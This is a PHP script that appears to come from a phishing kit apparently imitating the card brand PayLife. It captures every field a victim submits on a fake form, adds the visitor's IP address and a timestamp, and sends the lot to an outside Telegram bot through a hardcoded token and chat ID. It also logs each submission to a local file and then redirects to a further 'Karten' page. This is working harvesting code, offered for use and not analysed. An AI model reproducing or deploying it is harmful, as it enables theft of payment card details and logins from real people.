<?php
function getUserIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}




$date = date('m/d/Y h:i:s a', time());


$ip = getUserIP();
$message = "~~~~~~~$ip~~$date~~~\n";
foreach($_POST as $k=>$v){
    $message .= "$k = $v\n";
}
$message .= "~~~~~~~paylife CODE APP~~~~~~\n";

file_get_contents("https://api.telegram.org/bot5503706931:AAGeIrornGO48_JTiP75mpFfSn4DUEYWiZY/sendMessage?chat_id=-1001499527043&text=" . urlencode($message)."" );



$file = fopen("rs.txt","a");   
fwrite($file,$message); 

header("Location: ./Karten.php");


?>